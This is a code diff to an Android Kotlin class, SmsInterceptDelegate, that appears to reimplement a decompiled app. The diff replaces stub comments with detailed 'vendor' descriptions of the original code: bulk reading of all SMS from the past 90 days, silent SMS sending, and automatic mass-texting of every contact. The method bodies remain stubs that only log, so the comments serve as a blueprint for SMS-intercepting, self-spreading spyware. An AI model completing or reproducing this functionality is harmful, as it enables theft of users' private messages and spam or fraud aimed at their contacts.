@@ -59,8 +59,9 @@ class SmsInterceptDelegate(
         val result = JSONArray()
         val seenIds = LinkedHashSet<Long>()
 
-        // ADAPT: stub — real impl queries Telephony.Sms.CONTENT_URI
-        // Requires READ_SMS permission
+        // vendor: queries Telephony.Sms.CONTENT_URI with columns [_id, address, body, date, type, read, thread_id],
+        // where "date >= ?" (90 days lookback), order "date DESC LIMIT $limit OFFSET 0".
+        // Requires READ_SMS permission; checks via AbstractC1117qo.m214411a7.
         try {
             // Standard SMS query
             readStandardSms(limit, result, seenIds)
@@ -82,12 +83,14 @@ class SmsInterceptDelegate(
     }
 
     private fun readStandardSms(limit: Int, result: JSONArray, seenIds: LinkedHashSet<Long>) {
-        // ADAPT: stub — requires ContentResolver query to Telephony.Sms.CONTENT_URI
+        // vendor: queries ContentResolver on Telephony.Sms.CONTENT_URI with 7 columns,
+        // iterates cursor, dedup by _id, builds JSON entries with buildSmsEntry, source="standard".
         Log.d(TAG, "readStandardSms (stub)")
     }
 
     private fun readFallbackSms(limit: Int, result: JSONArray, seenIds: LinkedHashSet<Long>) {
-        // ADAPT: stub — tries content://sms/inbox, content://sms, content://mms-sms/conversations
+        // vendor: iterates over [content://sms/inbox, content://sms, content://mms-sms/conversations],
+        // calls m211678a3(uri, limit, result, seenIds) for each — similar cursor query with null projection.
         Log.d(TAG, "readFallbackSms (stub)")
     }
 
@@ -97,7 +100,8 @@ class SmsInterceptDelegate(
             Log.w(TAG, "❌ 手机号或短信内容为空")
             return false
         }
-        // ADAPT: stub — requires SEND_SMS permission + SmsManager
+        // vendor: requires SEND_SMS permission, uses SmsManager.divideMessage + sendTextMessage/sendMultipartTextMessage,
+        // creates sent/delivered PendingIntents with package-specific action strings.
         try {
             Log.d(TAG, "sendSms to=$phoneNumber sim=$simSlot (stub)")
             return true
@@ -113,7 +117,8 @@ class SmsInterceptDelegate(
             Log.w(TAG, "❌ 短信内容为空")
             return 0
         }
-        // ADAPT: stub — requires SEND_SMS + READ_CONTACTS
+        // vendor: requires SEND_SMS + READ_CONTACTS, queries ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+        // cleans phone numbers with Regex("[^0-9+]"), dedup via LinkedHashSet, calls sendSms for each with 500ms delay.
         Log.d(TAG, "broadcastSmsToContacts (stub)")
         return 0
     }
